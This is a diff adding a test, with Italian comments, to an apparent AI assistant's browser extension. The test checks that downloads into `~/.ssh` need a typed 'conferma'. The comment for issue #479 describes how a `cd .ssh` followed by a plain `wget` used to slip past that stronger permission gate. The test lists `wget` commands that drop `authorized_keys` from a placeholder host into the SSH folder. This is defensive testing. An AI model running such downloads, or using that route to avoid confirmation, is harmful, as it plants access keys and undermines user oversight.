@@ -172,6 +172,52 @@ test('livello 3: il bottone resta bloccato finché non si digita "conferma"', as
   expect(await page.evaluate(() => window.__typedResult)).toBe(true);
 });
 
+// #479 — scaricare dentro una cartella sensibile passava dalla conferma leggera.
+// `wget -O ~/.ssh/…` chiedeva di digitare "conferma"; `wget -P ~/.ssh …`, e
+// soprattutto un `cd ~/.ssh` (eseguito subito, senza chiedere niente, valido per
+// i comandi successivi) seguito da un normale `wget`, si fermavano all'OK. Stesso
+// effetto — un file scelto dal server che atterra su una chiave SSH — quindi
+// stessa conferma. E il popup deve dire DOVE il comando agisce: nel testo del
+// comando la cartella non compare.
+test('#479: scaricare dopo essersi spostati in una cartella sensibile chiede "conferma", e il popup dice dove', async ({ app, openTab }) => {
+  const page = await openTab(NEWTAB);
+  // La modalità terminale è il gate hard: senza, nessun comando arriva al livello.
+  await page.evaluate(async () => chrome.runtime.sendMessage({
+    type: 'filo_confirm_action',
+    action: { type: 'IMPOSTA_PREFERENZA', chiave: 'terminale', valore: 'on' },
+  }));
+
+  // 1) Lo spostamento resta gratuito: è la primitiva di navigazione dell'assistente.
+  const cd = await execAction(app, { type: 'ESEGUI_COMANDO', comando: 'cd .ssh' });
+  expect(cd.needsConfirm).toBeFalsy();
+
+  // 2) Il download SENZA flag di output — la strada che restava scoperta —
+  //    ora chiede di digitare "conferma".
+  const dl = await execAction(app, { type: 'ESEGUI_COMANDO', comando: 'wget http://esempio.test/authorized_keys' });
+  expect(dl.executed).toBe(false);
+  expect(dl.needsConfirm).toBe(3);
+  // 3) …e il popup dice in quale cartella il file andrebbe a finire.
+  expect(dl.describe).toContain('wget http://esempio.test/authorized_keys');
+  expect(dl.describe).toMatch(/Cartella di lavoro:\s*\S+/);
+  expect(dl.describe).toContain('.ssh');
+
+  // Anche la forma che sceglie la CARTELLA, e quella che riprende un download
+  // su un file già esistente, sono allo stesso livello.
+  for (const comando of [
+    'wget -P /home/utente/.ssh http://esempio.test/authorized_keys',
+    'wget -c http://esempio.test/authorized_keys',
+    'wget -N http://esempio.test/authorized_keys',
+  ]) {
+    const r = await execAction(app, { type: 'ESEGUI_COMANDO', comando });
+    expect(r.needsConfirm, comando).toBe(3);
+  }
+
+  // curl senza flag di output stampa a schermo: non fa atterrare niente, resta
+  // alla conferma leggera (nessuna frizione aggiunta dove non serve).
+  const stampa = await execAction(app, { type: 'ESEGUI_COMANDO', comando: 'curl http://esempio.test/x' });
+  expect(stampa.needsConfirm).toBe(2);
+});
+
 test('Esc annulla il popup di conferma', async ({ openTab }) => {
   const page = await openTab(NEWTAB);
   await page.evaluate(() => {
